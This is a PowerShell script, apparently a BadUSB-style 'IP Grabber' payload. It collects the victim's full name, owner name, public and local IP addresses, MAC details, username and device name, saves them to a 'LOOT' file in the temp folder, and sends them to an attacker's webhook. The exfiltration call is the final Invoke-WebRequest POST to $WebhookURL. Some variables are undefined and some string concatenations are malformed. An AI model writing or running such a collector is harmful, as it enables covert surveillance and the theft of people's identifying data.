$FileName = "$env:tmp/$env:USERNAME-LOOT-$(get-date -f yyyy-MM-dd_hh-mm).txt"

#------------------------------------------------------------------------------------------------------------------------------------

function Get-fullName {

    try {
    $fullName = (Get-LocalUser -Name $env:USERNAME).FullName
    }
 
 # If no name is detected function will return $env:UserName 

    # Write Error is just for troubleshooting 
    catch {Write-Error "No name was detected" 
    return $env:UserName
    -ErrorAction SilentlyContinue
    }

    return $fullName 

}

$fullName = Get-fullName


#------------------------------------------------------------------------------------------------------------------------------------

function Get-email {
    
    try {

    $email = (Get-CimInstance CIM_ComputerSystem).PrimaryOwnerName
    return $email
    }

# If no email is detected function will return backup message for sapi speak

    # Write Error is just for troubleshooting
    catch {Write-Error "An email was not found" 
    return "No Email Detected"
    -ErrorAction SilentlyContinue
    }        
}

$email = Get-email

#------------------------------------------------------------------------------------------------------------------------------------


try{$computerPubIP=(Invoke-WebRequest ipinfo.io/ip -UseBasicParsing).Content}
catch{$computerPubIP="Error getting Public IP"}

$localIPInterface = Get-NetIPAddress -InterfaceAlias "*Ethernet*","*Wi-Fi*" -AddressFamily IPv4 | Select InterfaceAlias | Out-String
$localIPAddress = Get-NetIPAddress -InterfaceAlias "*Ethernet*","*Wi-Fi*" -AddressFamily IPv4 | Select IPAddress | Out-String
$localIPOrigin = Get-NetIPAddress -InterfaceAlias "*Ethernet*","*Wi-Fi*" -AddressFamily IPv4 | Select PrefixOrigin | Out-String

$MACaddress = Get-NetAdapter -Name "*Ethernet*","*Wi-Fi*"| Select MacAddress | Out-String
$MACname = Get-NetAdapter -Name "*Ethernet*","*Wi-Fi*"| Select Name | Out-String
$MACstatus = Get-NetAdapter -Name "*Ethernet*","*Wi-Fi*"| Select Status | Out-String


#------------------------------------------------------------------------------------------------------------------------------------


$output = @"

Full Name: $fullName

Email: $email

------------------------------------------------------------------------------------------------------------------------------
Public IP: 
$computerPubIP

Local IPs:
$localIP

MAC:
$MAC

"@

$output > $FileName

#------------------------------------------------------------------------------------------------------------------------------------

# Create a new embed object
$Embed = New-Object -TypeName System.Object

# Set the properties of the embed
$Embed | Add-Member -MemberType NoteProperty -Name "title" -Value "IP Grabber Ran"
$Embed | Add-Member -MemberType NoteProperty -Name "description" -Value "Target Username:\n`" + $env:UserName + "`\nTarget Device Name:\n`" + $env:ComputerName + "`"
$Embed | Add-Member -MemberType NoteProperty -Name "color" -Value "16711680"
$Embed | Add-Member -Name 'Public IPv4 Address' -MemberType Noteproperty -Value "```\n" + $computerPubIP + "\n```"
$Embed | Add-Member -Name 'Private IPv4 Details' -MemberType Noteproperty -Value "```\nInterface Alias: " + $localIPInterface + "\nLocal IP Address: " + $localIPAddress + "\nOrigin: " + $localIPOrigin + "\n```"
$Embed | Add-Member -Name 'MAC Details' -MemberType Noteproperty -Value "```\nName: " + $MACname + "\nMAC Address: " + $MACaddress + "\nStatus: " + $MACstatus + "\n```"

# Convert the embed object to a JSON payload
$Payload = @{
    "embeds" = @($Embed)
} | ConvertTo-Json

Invoke-WebRequest -Method POST -Uri $WebhookURL -Body $Payload -ContentType "application/json"


#------------------------------------------------------------------------------------------------------------------------------------
